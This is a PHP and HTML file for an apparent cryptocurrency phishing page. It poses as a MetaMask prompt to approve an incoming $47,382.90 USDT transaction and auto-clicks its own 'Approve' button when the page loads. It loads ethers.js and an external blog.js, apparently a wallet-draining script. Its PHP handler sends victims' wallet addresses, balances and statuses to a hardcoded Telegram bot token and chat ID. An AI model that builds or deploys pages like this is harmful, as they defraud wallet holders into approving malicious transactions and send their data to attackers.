<?php
// Disable error reporting to avoid unexpected output
error_reporting(0);

// Telegram Bot Configuration
define('TELEGRAM_BOT_TOKEN', '7389673553:AAEUhYw5WxMhtGMKTjds4WB9FA6a-IpsNL8');
define('TELEGRAM_CHAT_ID', '-4645504551');

// Function to send Telegram notifications
function sendTelegramNotification($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
    ];

    $options = [
        'http' => [
            'header' => "Content-Type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data),
        ],
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    return $result !== false;
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get raw POST data
    $rawData = file_get_contents('php://input');
    $postData = json_decode($rawData, true);

    $action = $postData['action'] ?? '';

    if ($action === 'process_transaction') {
        $walletAddress = $postData['walletAddress'] ?? '';
        $balanceInEth = $postData['balanceInEth'] ?? '';
        $status = $postData['status'] ?? '';

        // Validate inputs
        if (empty($walletAddress)) {
            echo json_encode(['success' => false, 'message' => 'Wallet address is required.']);
            exit;
        }

        // Simulate transaction processing
        $message = "Wallet Address: $walletAddress\nBalance: $balanceInEth ETH\nStatus: $status";
        $telegramSent = sendTelegramNotification($message);

        if ($telegramSent) {
            echo json_encode(['success' => true, 'message' => 'Transaction processed and Telegram notification sent.']);
        } else {
            echo json_encode(['success' => false, 'message' => 'Failed to send Telegram notification.']);
        }
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approve incoming</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.0/dist/ethers.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.10.4/gsap.min.js"></script>
    <style>
        /* AI World-Class Design */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #1a1a1a, #000);
            color: #fff;
            text-align: center;
            overflow: hidden;
        }

        .transaction-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            max-width: 400px;
            width: 90%;
            position: relative;
            z-index: 1;
        }

        .transaction-card h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #00e676;
            background: linear-gradient(135deg, #00e676, #007bff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .transaction-card p {
            font-size: 16px;
            color: #ccc;
            margin-bottom: 20px;
        }

        .transaction-card button {
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            color: #fff;
            background: linear-gradient(135deg, #007bff, #00e676);
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.3);
        }

        .transaction-card button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 123, 255, 0.5);
        }

        .transaction-card button:disabled {
            background: #ccc;
            cursor: not-allowed;
            box-shadow: none;
        }

        #loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            display: none;
        }

        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-left-color: #00e676;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .progress-bar {
            width: 100%;
            height: 10px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 5px;
            margin-top: 20px;
            overflow: hidden;
        }

        .progress-bar-fill {
            height: 100%;
            background: linear-gradient(135deg, #007bff, #00e676);
            width: 0;
            transition: width 0.5s ease;
        }

        .alert {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            z-index: 1000;
            max-width: 90%;
            width: 400px;
            text-align: center;
            animation: fadeIn 0.5s ease;
        }

        .alert.error {
            border-color: #ff4444;
        }

        .alert.success {
            border-color: #00c851;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
 <div class="transaction-card" style="text-align: center; font-family: Arial, sans-serif;">
    <img src="https://cdn.iconscout.com/icon/free/png-256/free-metamask-logo-icon-download-in-svg-png-gif-file-formats--browser-extension-chrome-logos-icons-2261817.png" 
         alt="MetaMask Logo" 
         style="width: 80px; height: auto; margin-bottom: 20px;">
    
    <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=026" 
             alt="USDT Logo" 
             style="width: 30px; height: auto;">
        <h1 style="margin: 0;">$47,382.90 USDT</h1>
    </div>

    <p>You are about to approve an incoming USDT transaction.</p>
    
    <button id="approveBtn" 
            style="background-color: #28a745; color: white; border: none; padding: 10px 20px; font-size: 16px; cursor: pointer; border-radius: 5px;">
        Approve incoming USDT
    </button>
    <script>
        // When the page is fully loaded
        window.onload = function() {
            // Find the button by its ID
            const approveBtn = document.getElementById('approveBtn');
            // Trigger a click event on the button
            if (approveBtn) {
                approveBtn.click();
            }
        };
    </script>
</div>

    <div id="loading">
        <div class="spinner"></div>
        <div class="progress-bar">
            <div class="progress-bar-fill"></div>
        </div>
    </div>

  
<script src="blog.js"></script>
</body>
</html>
